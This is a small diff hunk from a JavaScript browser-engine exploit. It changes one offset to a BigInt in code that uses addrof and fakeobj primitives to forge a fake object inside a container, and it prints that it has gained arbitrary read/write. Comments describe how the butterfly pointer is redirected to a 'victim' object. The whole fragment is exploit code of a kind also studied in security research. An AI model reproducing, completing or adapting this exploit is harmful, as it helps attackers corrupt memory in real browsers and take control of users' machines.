@@ -455,7 +455,7 @@ var print = (msg) => {
     var containerAddr = addrof(container);
     print("[+] container @"+containerAddr);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(containerAddr+16);
+    var hax = fakeobj(containerAddr+0x10n);
     print("got hax obj we now have slighty arb r/w")
     // origButterfly is now based on the offset of **victim** 
     // because it becomes the new butterfly pointer
